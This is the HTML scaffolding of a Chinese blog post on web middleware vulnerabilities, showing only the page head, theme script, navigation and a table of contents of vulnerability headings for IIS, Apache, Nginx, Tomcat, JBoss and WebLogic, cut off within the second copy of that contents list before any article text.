<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>中间件漏洞 | Yogurt</title><meta name="description" content="中间件漏洞"><meta name="author" content="Yogurt"><meta name="copyright" content="Yogurt"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/mao.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin=""><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="中间件漏洞"><meta name="twitter:description" content="中间件漏洞"><meta name="twitter:image" content="https://dawangwangwang.github.io/img/default.jpg"><meta property="og:type" content="article"><meta property="og:title" content="中间件漏洞"><meta property="og:url" content="https://dawangwangwang.github.io/2019/05/10/中间件漏洞/"><meta property="og:site_name" content="Yogurt"><meta property="og:description" content="中间件漏洞"><meta property="og:image" content="https://dawangwangwang.github.io/img/default.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://dawangwangwang.github.io/2019/05/10/中间件漏洞/"><link rel="prev" title="缓存中间件" href="https://dawangwangwang.github.io/2019/05/15/缓存中间件/"><link rel="next" title="中间件" href="https://dawangwangwang.github.io/2019/04/23/中间件/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://dawangwangwang.github.io","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script></head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Yogurt</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 清单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">42</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">24</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">14</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 清单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#中间件、容器、服务器"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">中间件、容器、服务器</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#web服务器"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">web服务器</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#web中间件"><span class="toc_mobile_items-number">1.2.</span> <span class="toc_mobile_items-text">web中间件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#web容器"><span class="toc_mobile_items-number">1.3.</span> <span class="toc_mobile_items-text">web容器</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#常见web中间件及其漏洞概述"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">常见web中间件及其漏洞概述</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#一）-IIS"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">一） IIS</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#（二）-Apache"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">（二） Apache</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#（三）-Nginx"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">（三） Nginx</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#（四）Tomcat"><span class="toc_mobile_items-number">2.4.</span> <span class="toc_mobile_items-text">（四）Tomcat</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#（五）jBoss"><span class="toc_mobile_items-number">2.5.</span> <span class="toc_mobile_items-text">（五）jBoss</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#（六）WebLogic"><span class="toc_mobile_items-number">2.6.</span> <span class="toc_mobile_items-text">（六）WebLogic</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#（七）其它中间件相关漏洞"><span class="toc_mobile_items-number">2.7.</span> <span class="toc_mobile_items-text">（七）其它中间件相关漏洞</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#IIS漏洞分析"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">IIS漏洞分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#IIS简介"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">IIS简介</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Webdav漏洞"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">Webdav漏洞</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因"><span class="toc_mobile_items-number">3.2.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试"><span class="toc_mobile_items-number">3.2.2.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞危害"><span class="toc_mobile_items-number">3.2.3.</span> <span class="toc_mobile_items-text">漏洞危害</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复"><span class="toc_mobile_items-number">3.2.4.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#短文件名猜解"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">短文件名猜解</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-1"><span class="toc_mobile_items-number">3.3.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-1"><span class="toc_mobile_items-number">3.3.2.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞危害-1"><span class="toc_mobile_items-number">3.3.3.</span> <span class="toc_mobile_items-text">漏洞危害</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-1"><span class="toc_mobile_items-number">3.3.4.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#局限性"><span class="toc_mobile_items-number">3.3.5.</span> <span class="toc_mobile_items-text">局限性</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Apache漏洞分析"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">Apache漏洞分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#apache简介"><span class="toc_mobile_items-number">4.1.</span> <span class="toc_mobile_items-text">apache简介</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#解析漏洞"><span class="toc_mobile_items-number">4.2.</span> <span class="toc_mobile_items-text">解析漏洞</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-2"><span class="toc_mobile_items-number">4.2.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-2"><span class="toc_mobile_items-number">4.2.2.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-2"><span class="toc_mobile_items-number">4.2.3.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#目录遍历"><span class="toc_mobile_items-number">4.3.</span> <span class="toc_mobile_items-text">目录遍历</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-3"><span class="toc_mobile_items-number">4.3.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞复习"><span class="toc_mobile_items-number">4.3.2.</span> <span class="toc_mobile_items-text">漏洞复习</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-3"><span class="toc_mobile_items-number">4.3.3.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Nginx漏洞分析"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">Nginx漏洞分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Nginx简介"><span class="toc_mobile_items-number">5.1.</span> <span class="toc_mobile_items-text">Nginx简介</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#文件解析"><span class="toc_mobile_items-number">5.2.</span> <span class="toc_mobile_items-text">文件解析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-4"><span class="toc_mobile_items-number">5.2.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞复现"><span class="toc_mobile_items-number">5.2.2.</span> <span class="toc_mobile_items-text">漏洞复现</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-4"><span class="toc_mobile_items-number">5.2.3.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#目录遍历-1"><span class="toc_mobile_items-number">5.3.</span> <span class="toc_mobile_items-text">目录遍历</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-5"><span class="toc_mobile_items-number">5.3.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-5"><span class="toc_mobile_items-number">5.3.2.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#目录穿越"><span class="toc_mobile_items-number">5.4.</span> <span class="toc_mobile_items-text">目录穿越</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-6"><span class="toc_mobile_items-number">5.4.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-3"><span class="toc_mobile_items-number">5.4.2.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#修复"><span class="toc_mobile_items-number">5.4.3.</span> <span class="toc_mobile_items-text">修复</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Tomcat漏洞分析"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">Tomcat漏洞分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#简介"><span class="toc_mobile_items-number">6.1.</span> <span class="toc_mobile_items-text">简介</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#远程代码执行"><span class="toc_mobile_items-number">6.2.</span> <span class="toc_mobile_items-text">远程代码执行</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-7"><span class="toc_mobile_items-number">6.2.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-4"><span class="toc_mobile_items-number">6.2.2.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-6"><span class="toc_mobile_items-number">6.2.3.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#war后门文件部署"><span class="toc_mobile_items-number">6.3.</span> <span class="toc_mobile_items-text">war后门文件部署</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-8"><span class="toc_mobile_items-number">6.3.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-5"><span class="toc_mobile_items-number">6.3.2.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-7"><span class="toc_mobile_items-number">6.3.3.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#JBoss漏洞分析"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">JBoss漏洞分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#JBoss简介"><span class="toc_mobile_items-number">7.1.</span> <span class="toc_mobile_items-text">JBoss简介</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#反序列化漏洞"><span class="toc_mobile_items-number">7.2.</span> <span class="toc_mobile_items-text">反序列化漏洞</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞修复-8"><span class="toc_mobile_items-number">7.2.1.</span> <span class="toc_mobile_items-text">漏洞修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#war后门文件部署-1"><span class="toc_mobile_items-number">7.3.</span> <span class="toc_mobile_items-text">war后门文件部署</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-9"><span class="toc_mobile_items-number">7.3.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#JBoss漏洞防护"><span class="toc_mobile_items-number">7.3.2.</span> <span class="toc_mobile_items-text">JBoss漏洞防护</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#WebLogic漏洞分析"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">WebLogic漏洞分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#WebLogic简介"><span class="toc_mobile_items-number">8.1.</span> <span class="toc_mobile_items-text">WebLogic简介</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#反序列化漏洞-1"><span class="toc_mobile_items-number">8.2.</span> <span class="toc_mobile_items-text">反序列化漏洞</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞成因-10"><span class="toc_mobile_items-number">8.2.1.</span> <span class="toc_mobile_items-text">漏洞成因</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#修复-1"><span class="toc_mobile_items-number">8.2.2.</span> <span class="toc_mobile_items-text">修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#SSRF"><span class="toc_mobile_items-number">8.3.</span> <span class="toc_mobile_items-text">SSRF</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-6"><span class="toc_mobile_items-number">8.3.1.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#修复-2"><span class="toc_mobile_items-number">8.3.2.</span> <span class="toc_mobile_items-text">修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#任意文件上传"><span class="toc_mobile_items-number">8.4.</span> <span class="toc_mobile_items-text">任意文件上传</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#漏洞测试-7"><span class="toc_mobile_items-number">8.4.1.</span> <span class="toc_mobile_items-text">漏洞测试</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#修复-3"><span class="toc_mobile_items-number">8.4.2.</span> <span class="toc_mobile_items-text">修复</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#war后门文件部署-2"><span class="toc_mobile_items-number">8.5.</span> <span class="toc_mobile_items-text">war后门文件部署</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#修复-4"><span class="toc_mobile_items-number">8.5.1.</span> <span class="toc_mobile_items-text">修复</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#中间件、容器、服务器"><span class="toc-number">1.</span> <span class="toc-text">中间件、容器、服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web服务器"><span class="toc-number">1.1.</span> <span class="toc-text">web服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web中间件"><span class="toc-number">1.2.</span> <span class="toc-text">web中间件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web容器"><span class="toc-number">1.3.</span> <span class="toc-text">web容器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常见web中间件及其漏洞概述"><span class="toc-number">2.</span> <span class="toc-text">常见web中间件及其漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一）-IIS"><span class="toc-number">2.1.</span> <span class="toc-text">一） IIS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（二）-Apache"><span class="toc-number">2.2.</span> <span class="toc-text">（二） Apache</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（三）-Nginx"><span class="toc-number">2.3.</span> <span class="toc-text">（三） Nginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（四）Tomcat"><span class="toc-number">2.4.</span> <span class="toc-text">（四）Tomcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（五）jBoss"><span class="toc-number">2.5.</span> <span class="toc-text">（五）jBoss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（六）WebLogic"><span class="toc-number">2.6.</span> <span class="toc-text">（六）WebLogic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（七）其它中间件相关漏洞"><span class="toc-number">2.7.</span> <span class="toc-text">（七）其它中间件相关漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IIS漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">IIS漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS简介"><span class="toc-number">3.1.</span> <span class="toc-text">IIS简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webdav漏洞"><span class="toc-number">3.2.</span> <span class="toc-text">Webdav漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">3.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞危害"><span class="toc-number">3.2.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复"><span class="toc-number">3.2.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#短文件名猜解"><span class="toc-number">3.3.</span> <span class="toc-text">短文件名猜解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-1"><span class="toc-number">3.3.2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞危害-1"><span class="toc-number">3.3.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-1"><span class="toc-number">3.3.4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#局限性"><span class="toc-number">3.3.5.</span> <span class="toc-text">局限性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache漏洞分析"><span class="toc-number">4.</span> <span class="toc-text">Apache漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#apache简介"><span class="toc-number">4.1.</span> <span class="toc-text">apache简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解析漏洞"><span class="toc-number">4.2.</span> <span class="toc-text">解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-2"><span class="toc-number">4.2.2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-2"><span class="toc-number">4.2.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目录遍历"><span class="toc-number">4.3.</span> <span class="toc-text">目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-3"><span class="toc-number">4.3.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复习"><span class="toc-number">4.3.2.</span> <span class="toc-text">漏洞复习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-3"><span class="toc-number">4.3.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-item 